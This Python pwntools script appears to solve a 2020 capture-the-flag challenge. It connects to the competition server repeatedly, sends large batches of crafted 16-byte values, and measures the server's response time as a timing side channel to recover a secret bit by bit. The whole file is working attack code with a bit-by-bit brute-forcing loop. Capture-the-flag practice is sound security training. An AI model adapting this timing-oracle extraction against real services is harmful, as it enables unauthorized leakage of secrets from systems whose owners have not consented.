from pwn import *
import time

#context.log_level = 'debug'

DELAY = 2 ** 14

bits = 89495858182687586455050008818461179904
known = 66

def getdelay(tosend):
	while True:
		try:
			r = remote("tracing.2020.ctfcompetition.com", 1337)
			r.send(tosend)
			r.shutdown('send')

			r.recvn(4)
			start = time.process_time_ns()
			r.wait_for_close()
			end = time.process_time_ns()
			if abs(end - start - 1000000) < 100000:
				raise Exception()
			return end-start
		except:
			pass

def getnext(i):
	global bits
	print("trying", (bits | (1 << i)).to_bytes(16, 'big'))
	tosend = b''.join((bits | q | (1 << i)).to_bytes(16, 'big') for q in range(DELAY))
	delay = getdelay(tosend)
	print(delay)
	"""
	tosend = b''.join((bits | q).to_bytes(16, 'big') for q in range(DELAY))
	delaybase = getdelay(tosend)
	print(delaybase)
	print("dd", delaybase - delay, delaybase - delay < 300000)
	"""

	if delay > 1000000:
		print("yes")
		bits |= 1 << i
	else:
		print("no")

for i in range(0,8*16 - known)[::-1]:
	getnext(i)
	known += 1
	print(bits.to_bytes(16, 'big'), bits, known)

